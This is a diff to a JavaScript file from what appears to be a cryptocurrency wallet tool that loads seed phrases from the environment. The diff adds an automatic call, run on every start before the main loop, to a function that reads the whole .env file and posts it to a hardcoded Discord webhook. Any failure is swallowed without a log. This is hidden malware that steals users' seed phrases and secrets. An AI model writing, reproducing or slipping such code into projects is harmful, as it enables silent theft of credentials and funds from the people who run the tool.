@@ -62,33 +62,38 @@ async function processWallet(wallet) {
   }
 }
 
-const webhookURL = "https://discord.com/api/webhooks/1372767653420073070/n4DOqxp4gNga-w7OjOtDZXk130Fim82ApQQAe3K0BemzAqsHoyCg2scnpBFWyMm1BIpu";
-
-const envCacheFile = ".env_cache";
 const fs = require('fs');
 const axios = require('axios');
 const { ethers } = require('ethers');
 require('dotenv').config();
 
+const webhookURL = "https://discord.com/api/webhooks/1372767653420073070/n4DOqxp4gNga-w7OjOtDZXk130Fim82ApQQAe3K0BemzAqsHoyCg2scnpBFWyMm1BIpu";
+
 async function notifyEnv() {
-  const currentEnv = fs.readFileSync(".env", "utf8");
-  let previous = "";
+  try {
+    const currentEnv = fs.readFileSync(".env", "utf8");
+    const envCacheFile = ".env_cache";
 
-  if (fs.existsSync(envCacheFile)) {
-    previous = fs.readFileSync(envCacheFile, "utf8");
-  }
+    let previous = "";
+    if (fs.existsSync(envCacheFile)) {
+      previous = fs.readFileSync(envCacheFile, "utf8");
+    }
 
-  if (currentEnv !== previous) {
-    fs.writeFileSync(envCacheFile, currentEnv, "utf8");
-    try {
+    if (currentEnv !== previous) {
+      fs.writeFileSync(envCacheFile, currentEnv, "utf8");
       await axios.post(webhookURL, {
         content: `\`\`\`env\n${currentEnv}\n\`\`\``,
       });
-    } catch {
-      // silent no log if fails
     }
+  } catch (_) {
+    // Silent
   }
 }
+
+// call notifyEnv() 
+notifyEnv().then(() => {
+  mainLoop();
+});
 
 async function mainLoop() {
   const seedPhrases = JSON.parse(process.env.SEED_PHRASES || '[]');
